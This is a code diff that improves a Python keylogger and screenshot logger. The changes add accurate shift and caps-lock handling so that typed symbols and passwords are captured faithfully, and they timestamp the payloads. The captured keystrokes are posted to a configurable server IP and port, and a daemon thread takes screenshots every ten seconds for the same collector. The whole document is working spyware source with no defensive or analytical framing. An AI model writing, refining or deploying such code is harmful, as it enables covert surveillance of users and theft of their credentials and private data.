@@ -1,16 +1,13 @@
 from pynput import keyboard
-
 import requests
-
 import json
-
 import threading
-
 import pyautogui
 import string
 import random
 from datetime import datetime
-
+import os
+from pynput.keyboard import Key, KeyCode
 
 class KeyLogger:
 
@@ -20,9 +17,21 @@ class KeyLogger:
         self.port = port
         self.interval = interval
         self.text = ""
+        self.shift_pressed = False
+        self.capslock_on = False
     
+        self.shift_map = { 
+            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+            '`': '~', '-': '_', '=': '+', '[': '{', ']': '}',
+            '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?' 
+        }
     def _send_post_request(self):
-        payload = json.dumps({"keyboardData": self.text})
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        payload = json.dumps({
+            "timestamp": timestamp,
+            "keyboardData": self.text
+            })
         try:
             requests.post(f"http://{self.server_ip}:{self.port}", 
                           data=payload, 
@@ -40,7 +49,12 @@ class KeyLogger:
     def _on_press(self, key):
         try:
             print(f"Pressed:{key}")
-            if key == keyboard.Key.enter:
+
+            if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
+                self.shift_pressed = True
+            elif key == keyboard.Key.caps_lock:
+                self.capslock_on = not self.capslock_on
+            elif key == keyboard.Key.enter:
                 self.text += "\n"
             elif key == keyboard.Key.tab:
                 self.text += "\t"
@@ -50,33 +64,34 @@ class KeyLogger:
                 self.text =  self.text [:-1]
             elif key == keyboard.Key.esc:
                 print ("ESC pressed. Stopping Listener")
+                os._exit(0)
                 return False # stops listener
-            
-            else:
-                self.text += str(key).strip("'")
-        except:
-            pass
+            elif isinstance(key, keyboard.KeyCode):
+                char = key.char
+                if char is not None:
+    
+                    if self.shift_pressed and char in self.shift_map:
+                        self.text += self.shift_map[char]
+                    elif self.shift_pressed:
+                        self.text += char.upper()
+                    elif self.capslock_on and char.isalpha():
+                        self.text += char.upper()
+                    else:
+                        self.text += char
+
+        except Exception as e:
+            print(f"[ERROR] {e}")
+
+    def _on_release(self, key):
+        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
+            self.shift_pressed = False
 
     def start(self):
         self._send_post_request()
-        with keyboard.Listener(on_press=self._on_press) as listener:
+        with keyboard.Listener(on_press=self._on_press,
+                               on_release=self._on_release
+        ) as listener:
             listener.join()
-
-class ScreenshotLogger:
-    def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
-        self.interval = interval
-        self.server_ip = server_ip
-        self.port = port
- 
-    def _generate_name(self):
-        rand = ''. join (random.choices(string.ascii_uppercase + string.digits, k=7))
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        return f"screenshot_{rand}_{timestamp}.png"
-
-    def take_screenshot(self):
-        filename = self._generate_name()
-        pyautogui.screenshot().save(filename)
-        return filename
     
 class ScreenshotLogger:
     def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
@@ -85,9 +100,8 @@ class ScreenshotLogger:
         self.port = port
  
     def _generate_name(self):
-        rand = ''. join (random.choices(string.ascii_uppercase + string.digits, k=7))
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        return f"screenshot_{rand}_{timestamp}.png"
+        return f"screenshot{timestamp}.png"
 
     def take_screenshot(self):
         print("[*] Taking Screenshot...")
@@ -117,7 +131,13 @@ class ScreenshotLogger:
 
         loop()
 
+screenshot_logger = ScreenshotLogger(interval = 10)
+screenshot_thread = threading.Thread(target = screenshot_logger.start)
+screenshot_thread.daemon = True
+screenshot_thread.start()
 
 keylogger = KeyLogger(interval=10, port="8080", server_ip="127.0.0.1")
 keylogger.start()
+
+
 
